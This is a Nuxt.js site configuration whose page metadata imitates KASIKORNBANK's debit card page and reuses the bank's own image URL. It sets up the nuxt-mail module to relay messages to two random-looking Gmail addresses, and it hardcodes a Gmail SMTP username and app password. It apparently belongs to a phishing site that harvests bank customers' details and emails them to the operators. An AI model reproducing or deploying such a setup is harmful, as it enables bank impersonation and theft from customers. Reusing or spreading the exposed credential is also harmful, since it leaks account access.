// https://nuxt.com/docs/api/configuration/nuxt-config
export default defineNuxtConfig({
  devtools: { enabled: true },
  css: ['~/assets/css/main.css'],
  plugins: ['~/plugins/currency.js'],
  modules: [
    '@nuxtjs/tailwindcss','nuxt-icon',
    ['nuxt-mail', {
      message: [
        { name: 'support1', to: 'wesleykennedy4mvkeq8@gmail.com' },
        { name: 'support2', to: 'RiverStephensvxpakoz@gmail.com' },
      ],
      
      smtp: {
        service: 'gmail',
        auth: {
          user: 'riverstephensvxpakoz@gmail.com',
          pass: 'epaf cxvo sqoo ivad',
        },
      },
    }],
 
  ],
  app: {
    head: {
      title: 'KbankKasikorn Debit Card - KASIKORNBANK',
      meta: [
        { name: 'title', content: 'Kasikorn Debit Card - KASIKORNBANK' },
        { name: 'keywords', content: 'card, bank card, kasikorn card, kasikorn card, kbank card, kbank card, debit card, kasikorn debit card, kbank debit card, kbank debit card, apply for kasikorn debit card, debit card is, debit card, atm card, press Cash, Swipe to buy products, Buy products online, Cashless cards, Cashless, Link cards, Withdraw deposits' },
        { name: 'description', content: 'Includes debit cards, answering every lifestyle need, withdraw money at ATM, swipe, tap and buy products. or spend online Apply for a debit card now through K PLUS with special privileges from many leading stores.' },
        
        { name: 'og:image', content: 'https://www.kasikornbank.com//SiteCollectionDocuments/Sharing_Default.jpg' },
        { name: 'og:type', content: 'website' },
        { name: 'og:title', content: 'Kasikorn Debit Card - KASIKORNBANK' },
        { name: 'og:description', content: 'Includes debit cards, answering every lifestyle need, withdraw money at ATM, swipe, tap and buy products. or spend online Apply for a debit card now through K PLUS with special privileges from many leading stores.' },
      ],
      link: [
        { rel: 'icon', type: 'image/x-icon', href: '/favicon.png' }
      ]
    },
  }
  
})
